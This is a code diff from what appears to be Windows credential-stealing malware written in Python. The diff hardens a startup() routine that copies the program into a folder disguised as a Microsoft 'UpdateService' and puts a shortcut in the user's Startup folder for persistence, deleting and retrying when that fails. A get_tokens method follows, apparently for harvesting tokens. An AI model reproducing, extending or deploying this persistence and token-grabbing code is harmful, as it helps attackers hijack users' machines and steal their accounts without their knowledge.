@@ -112,11 +112,14 @@ class main():
 			with open(bd, 'w', newline='', encoding="utf8", errors='ignore') as f: f.write(content)
 
 	def startup(self):
-		shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
-		shell = win32com.client.Dispatch("WScript.Shell")
-		shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
-		shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
-		shortcut.save()
+		try: shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+		except: shutil.rmtree(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService"); self.startup()
+		try: 
+			shell = win32com.client.Dispatch("WScript.Shell")
+			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk")
+			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
+			shortcut.save()
+		except: os.remove(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.lnk"); self.startup() 
 
 
 	def get_tokens(self, path):
